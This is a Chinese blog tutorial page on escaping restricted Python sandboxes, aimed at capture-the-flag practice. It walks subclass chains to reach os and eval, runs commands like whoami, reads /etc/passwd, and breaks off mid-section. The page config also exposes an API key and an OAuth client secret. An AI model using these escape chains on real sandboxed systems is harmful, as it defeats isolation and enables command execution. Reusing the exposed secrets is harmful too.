<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="python的沙箱逃匿"><meta name="keywords" content=""><meta name="author" content="ye1s,undefined"><meta name="copyright" content="ye1s"><title>python的沙箱逃匿【ye1s】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"LKL6Q0GQJM","apiKey":"03829f64e2f5c11e4a5e2b8e51e24eb9","indexName":"blog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: {"owner":"ye1sec","repo":"comments","client_id":"d5ece338867af32b6dfa","client_secret":"2caf36bbd47977524017f95105315fc9e65f0577"},
}</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="ye1s" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#执行模块"><span class="toc-number">1.</span> <span class="toc-text">执行模块</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#执行命令的模块"><span class="toc-number">1.1.</span> <span class="toc-text">执行命令的模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件读取的模块"><span class="toc-number">1.2.</span> <span class="toc-text">文件读取的模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取当前Python环境信息"><span class="toc-number">1.3.</span> <span class="toc-text">获取当前Python环境信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#执行函数"><span class="toc-number">2.</span> <span class="toc-text">执行函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#内联函数"><span class="toc-number">3.</span> <span class="toc-text">内联函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#魔术函数"><span class="toc-number">4.</span> <span class="toc-text">魔术函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#object类"><span class="toc-number">5.</span> <span class="toc-text">object类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常见的逃匿思路"><span class="toc-number">6.</span> <span class="toc-text">常见的逃匿思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#代码执行"><span class="toc-number">7.</span> <span class="toc-text">代码执行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#import限制与绕过"><span class="toc-number">8.</span> <span class="toc-text">import限制与绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#builtin"><span class="toc-number">9.</span> <span class="toc-text">builtin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#其他特殊函数"><span class="toc-number">10.</span> <span class="toc-text">其他特殊函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OpCode"><span class="toc-number">11.</span> <span class="toc-text">OpCode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#过滤绕过"><span class="toc-number">12.</span> <span class="toc-text">过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤-globals"><span class="toc-number">12.1.</span> <span class="toc-text">过滤__globals__</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤global"><span class="toc-number">12.2.</span> <span class="toc-text">过滤global</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#base64编码"><span class="toc-number">12.3.</span> <span class="toc-text">base64编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reload-方法"><span class="toc-number">12.4.</span> <span class="toc-text">reload()方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#字符串拼接"><span class="toc-number">12.5.</span> <span class="toc-text">字符串拼接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤中括号"><span class="toc-number">12.6.</span> <span class="toc-text">过滤中括号</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctf例题"><span class="toc-number">13.</span> <span class="toc-text">ctf例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#examp1"><span class="toc-number">13.1.</span> <span class="toc-text">examp1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#examp2"><span class="toc-number">13.2.</span> <span class="toc-text">examp2</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">ye1s</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/ye1sec" target="_blank">GitHub<i class="icon-dot bg-color8"></i></a><a class="links-button button-hover" href="mailto:431774437@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color9"></i></a><a class="links-button button-hover" href="tencent://message/?uin=431774437&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color8"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">200</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">149</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">12</span></a></div><div class="friend-link"><a class="friend-link-text" href="http://www.m00nback.xyz/" target="_blank">MoonBack</a><a class="friend-link-text" target="_blank">待定</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">ye1s</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">python的沙箱逃匿</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2020-07-08 | 更新于 2021-07-08</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"></div><div class="button-hover tags"></div></div></div><div class="main-content"><p>沙箱逃逸就是在在一个严格限制的python环境中，通过绕过限制和过滤达到执行更高权限，甚至getshell的过程 。</p>
<a id="more"></a>

<h1 id="执行模块"><a href="#执行模块" class="headerlink" title="执行模块"></a>执行模块</h1><h2 id="执行命令的模块"><a href="#执行命令的模块" class="headerlink" title="执行命令的模块"></a>执行命令的模块</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">os</span><br><span class="line">timeit </span><br><span class="line">plarform</span><br><span class="line">subprocess</span><br><span class="line">pty</span><br><span class="line">commands</span><br></pre></td></tr></table></figure>
<p>os模块<br>os，语义为操作系统，模块提供了访问多个操作系统服务的功能，可以处理文件和目录。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">os模块</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 执行shell命令不会返回shell的输出</span></span><br><span class="line">os.system(<span class="string">'whoami'</span>)</span><br><span class="line"><span class="comment"># 会产生返回值，可通过read()的方式读取返回值</span></span><br><span class="line">os.popen(<span class="string">"whoami"</span>).read()</span><br><span class="line">commands模块</span><br></pre></td></tr></table></figure>

<p>timeit模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('dir')"</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>plarform模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">print</span> platform.popen(<span class="string">'dir'</span>).read()</span><br></pre></td></tr></table></figure>
<p>subprocess模块  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.call(<span class="string">'dir'</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">'dir'</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()</span><br><span class="line"><span class="comment">#stdin, stdout, stderr： 分别表示程序标准输入、输出、错误句柄。</span></span><br><span class="line"></span><br><span class="line">python3</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run(<span class="string">'dir'</span>,shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>pty模块  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#仅限Linux环境</span><br><span class="line">import pty</span><br><span class="line">pty.spawn(&quot;ls&quot;)</span><br></pre></td></tr></table></figure>
<p>commands模块<br>commands模块会返回命令的输出和执行的状态位，仅限Linux环境</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import commands</span><br><span class="line">commands.getstatusoutput(&quot;ls&quot;)</span><br><span class="line">commands.getoutput(&quot;ls&quot;)</span><br><span class="line">commands.getstatus(&quot;ls&quot;)</span><br></pre></td></tr></table></figure>
<h2 id="文件读取的模块"><a href="#文件读取的模块" class="headerlink" title="文件读取的模块"></a>文件读取的模块</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file</span><br><span class="line">open</span><br><span class="line">codecs</span><br><span class="line">fileinput</span><br></pre></td></tr></table></figure>
<p>file()函数<br>该函数只存在于Python2，Python3不存在</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file(<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line">file(<span class="string">'test.txt'</span>,<span class="string">'w'</span>).write(<span class="string">'xxx'</span>)</span><br></pre></td></tr></table></figure>
<p>open()函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">'text.txt'</span>).read()</span><br></pre></td></tr></table></figure>
<p>codecs模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">codecs.open(<span class="string">'test.txt'</span>).read()</span><br></pre></td></tr></table></figure>
<h2 id="获取当前Python环境信息"><a href="#获取当前Python环境信息" class="headerlink" title="获取当前Python环境信息"></a>获取当前Python环境信息</h2><p>sys模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.version</span><br><span class="line">sys.path</span><br><span class="line">sys.modules</span><br></pre></td></tr></table></figure>
<h1 id="执行函数"><a href="#执行函数" class="headerlink" title="执行函数"></a>执行函数</h1><p>exec()，eval()，execfile()，compile()函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line">exec(<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line">eval()函数只能计算单个表达式的值，而exec()函数可以动态运行代码段。</span><br><span class="line">eval()函数可以有返回值，而exec()函数返回值永远为<span class="literal">None</span>。</span><br><span class="line">compile(<span class="string">'a = 1 + 2'</span>, <span class="string">'&lt;string&gt;'</span>, <span class="string">'exec'</span>)</span><br></pre></td></tr></table></figure>
<p>sys模块<br>该模块通过modules()函数引入命令执行模块来实现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.modules[&#39;os&#39;].system(&#39;calc&#39;)</span><br></pre></td></tr></table></figure>
<h1 id="内联函数"><a href="#内联函数" class="headerlink" title="内联函数"></a>内联函数</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下面代码可列出所有的内联函数</span></span><br><span class="line">dir(__builtins__)</span><br><span class="line"><span class="comment"># Python3有一个builtins模块，可以导入builtins模块后通过dir函数查看所有的内联函数</span></span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line">dir(builtins)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dir()函数</span><br><span class="line">在没有参数的时候返回本地作用域中的名称列表   </span><br><span class="line">在有参数的时候返回该对象的有效属性列表</span><br></pre></td></tr></table></figure>
<h1 id="魔术函数"><a href="#魔术函数" class="headerlink" title="魔术函数"></a>魔术函数</h1><p>python沙箱逃逸还是离不开继承关系和子父类关系，在查看和使用类的继承，魔法函数起到了不可比拟的作用。  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__class__ 返回一个实例所属的类</span><br><span class="line">__mro__ 查看类继承的所有父类，直到object</span><br><span class="line">__subclasses__() 获取一个类的子类，返回的是一个列表</span><br><span class="line">__bases__ 返回一个类直接所继承的类（元组形式）</span><br><span class="line">__init__ 类实例创建之后调用, 对当前对象的实例的一些初始化</span><br><span class="line">__globals__  使用方式是 函数名.__globals__，返回一个当前空间下能使用的模块，方法和变量的字典</span><br><span class="line">__getattribute__ 当类被调用的时候，无条件进入此函数。</span><br><span class="line">__getattr__ 对象中不存在的属性时调用</span><br><span class="line">__dict__ 返回所有属性，包括属性，方法等</span><br></pre></td></tr></table></figure>
<p>例子  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.name = <span class="string">"Bob"</span></span><br><span class="line">		print(<span class="string">'ok'</span>)</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__getattribute__</span><span class="params">(self,item)</span>:</span></span><br><span class="line">		print(<span class="string">"getattribute"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self)</span>:</span></span><br><span class="line">		print(<span class="string">'getattr'</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span><span class="params">(A)</span>:</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span><span class="params">(A)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span><span class="params">(B, C)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">a=A()</span><br><span class="line">print(a.__class__)<span class="comment">#__main__.A</span></span><br><span class="line">print(D.__mro__)</span><br><span class="line">print(B.__subclasses__())</span><br><span class="line">print(B.__base__)</span><br><span class="line">print(A.__init__.__globals__)</span><br><span class="line">print(a.name)</span><br><span class="line">print(a.age)</span><br><span class="line"></span><br><span class="line">result:</span><br><span class="line">ok</span><br><span class="line">getattribute</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">(&lt;class '__main__.D'&gt;, &lt;class '__main__.B'&gt;, &lt;class '__main__.C'&gt;, &lt;class '__main__.A'&gt;, &lt;type 'object'&gt;)</span><br><span class="line">[&lt;<span class="class"><span class="keyword">class</span> '<span class="title">__main__</span>.<span class="title">D</span>'&gt;]</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">__main__</span>.<span class="title">A</span>'&gt;</span></span><br><span class="line">&#123;'A': &lt;class '__main__.A'&gt;, 'a': &lt;__main__.A object at 0x0000000002C00F28&gt;, 'C': &lt;class '__main__.C'&gt;, 'B': &lt;class '__main__.B'&gt;, 'D': &lt;class '__main__.D'&gt;, '__builtins__': &lt;module '__builtin__' (built-in)&gt;, '__file__': 'G:\\ctf\\test.py', '__package__': None, '__name__': '__main__', '__doc__': None&#125;</span><br><span class="line">getattribute</span><br><span class="line"><span class="literal">None</span></span><br><span class="line">getattribute</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>
<h1 id="object类"><a href="#object类" class="headerlink" title="object类"></a>object类</h1><blockquote>
<p>对于支持继承的编程语言来说，其方法（属性）可能定义在当前类，也可能来自于基类，所以在方法调用时就需要对当前类和基类进行搜索以确定方法所在的位置。而搜索的顺序就是所谓的「方法解析顺序」（Method Resolution Order，或MRO）。</p>
</blockquote>
<p>关于MRO的文章：<a href="http://hanjianwei.com/2013/07/25/python-mro/" target="_blank" rel="noopener">http://hanjianwei.com/2013/07/25/python-mro/</a>   </p>
<p>python的主旨是一切变量皆对象<br>python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，主要是通过<code>__mro__</code>和 <code>__bases__</code>两种方式来创建。<br><code>__mro__</code>属性获取类的MRO(方法解析顺序)，也就是继承关系。<br><code>__bases__</code>属性可以获取上一层的继承关系，如果是多层继承则返回上一层的东西，可能有多个。     </p>
<p>通过<code>__mro__</code> 和<code>__bases__</code>两种方式创建object类  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">python3</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">python2</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br></pre></td></tr></table></figure>
<p>然后通过object类的<code>__subclasses__()</code>方法来获得当前环境下能够访问的所有对象，因为调用对象的 <code>__subclasses__()</code> 方法会返回当前环境中所有继承于该对象的对象.。Python2和Python3获取的结果不同。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br></pre></td></tr></table></figure>
<h1 id="常见的逃匿思路"><a href="#常见的逃匿思路" class="headerlink" title="常见的逃匿思路"></a>常见的逃匿思路</h1><p>常见逃逸思路<br>当函数被禁用时，就要通过一些类中的关系来引用被禁用的函数。一些常见的寻找特殊模块的方式如下所示:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">* __class__:获得当前对象的类</span><br><span class="line">* __bases__ :列出其基类</span><br><span class="line">* __mro__ :列出解析方法的调用顺序，类似于bases</span><br><span class="line">* __subclasses__()：返回子类列表</span><br><span class="line">* __dict__ ： 列出当前属性/函数的字典</span><br><span class="line">* func_globals：返回一个包含函数全局变量的字典引用</span><br><span class="line">* 从().__class__.__bases__[<span class="number">0</span>].__subclasses__()出发，查看可用的类</span><br><span class="line">* 若类中有file，考虑读写操作</span><br><span class="line">* 若类中有&lt;<span class="class"><span class="keyword">class</span> '<span class="title">warnings</span>.<span class="title">WarningMessage</span>'&gt;，考虑从.<span class="title">__init__</span>.<span class="title">func_globals</span>.<span class="title">values</span><span class="params">()</span>[13]获取<span class="title">eval</span>，<span class="title">map</span>等等；又或者从.<span class="title">__init__</span>.<span class="title">func_globals</span>[<span class="title">linecache</span>]得到<span class="title">os</span></span></span><br><span class="line"><span class="class">* 若类中有&lt;<span class="title">type</span> '<span class="title">file</span>'&gt;，&lt;<span class="title">class</span> '<span class="title">ctypes</span>.<span class="title">CDLL</span>'&gt;，&lt;<span class="title">class</span> '<span class="title">ctypes</span>.<span class="title">LibraryLoader</span>'&gt;，考虑构造<span class="title">so</span>文件</span></span><br></pre></td></tr></table></figure>
<p>获取object类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[2]</span><br><span class="line">[].__class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__mro__[1]</span><br><span class="line">().__class__.__mro__[1]</span><br><span class="line">[].__class__.__mro__[-1]</span><br><span class="line">&#123;&#125;.__class__.__mro__[-1]</span><br><span class="line">().__class__.__mro__[-1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#python2</span><br><span class="line">&#39;&#39;.__class__.__mro__[2]</span><br><span class="line"></span><br><span class="line">#python3 </span><br><span class="line">&#39;&#39;.__class__.__mro__[1]</span><br></pre></td></tr></table></figure>
<p>然后通过object类的<code>__subclasses__()</code>方法获取所有的子类列表  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[<span class="number">1</span>].__subclasses__()</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>].__subclasses__()</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line"></span><br><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()</span><br><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()</span><br></pre></td></tr></table></figure>
<p>找到重载过的<code>__init__</code>类，例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">59</span>].__init__</span><br></pre></td></tr></table></figure>
<p>在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的，因为wrapper是指这些函数并没有被重载，这时它们并不是function，不具有<code>__globals__</code>属性。<br><img src="../../images/python/sandbox/3.png" alt=""><br>写个脚本帮我们来筛选出重载过的<strong>init</strong>类的类：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l=len([].__class__.__mro__[<span class="number">1</span>].__subclasses__())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'wrapper'</span> <span class="keyword">not</span> <span class="keyword">in</span> str([].__class__.__mro__[<span class="number">1</span>].__subclasses__()[i].__init__):</span><br><span class="line">        print(i,[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[i])</span><br></pre></td></tr></table></figure>
<p>result<br>python2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;)</span><br><span class="line">(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;)</span><br><span class="line">(61, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;)</span><br><span class="line">(62, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;)</span><br><span class="line">(72, &lt;class &#39;site._Printer&#39;&gt;)</span><br><span class="line">(74, &lt;class &#39;site.Quitter&#39;&gt;)</span><br><span class="line">(75, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;)</span><br><span class="line">(76, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;)</span><br></pre></td></tr></table></figure>
<p>python3:</p>
